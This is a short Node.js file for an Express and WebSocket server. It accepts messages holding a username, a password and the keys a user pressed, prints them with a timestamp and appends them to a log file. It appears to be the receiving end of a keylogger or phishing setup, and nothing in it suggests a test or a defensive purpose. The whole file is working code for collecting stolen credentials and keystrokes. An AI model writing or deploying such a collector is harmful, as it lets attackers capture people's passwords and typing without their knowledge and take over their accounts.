const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static('public'));

wss.on('connection', function connection(ws) {
  console.log('Client connected');

  ws.on('message', function incoming(message) {
    const data = JSON.parse(message);
    const logData = `${new Date().toLocaleString()} - Username: ${data.username}, Password: ${data.password}, Keys Pressed: ${data.keysPressed}\n`;

    console.log(logData);
    // Log the received message (pressed keys) along with username, password, and time details in the terminal
    console.log(logData);
    
    // Log the received message (pressed keys) along with username, password, and time details in a text file
    fs.appendFile('log.txt', logData, (err) => {
      if (err) {
        console.error('Error writing to log.txt:', err);
      }
    });
  });
});

server.listen(3000, function() {
  console.log('Server listening on port 3000');
});
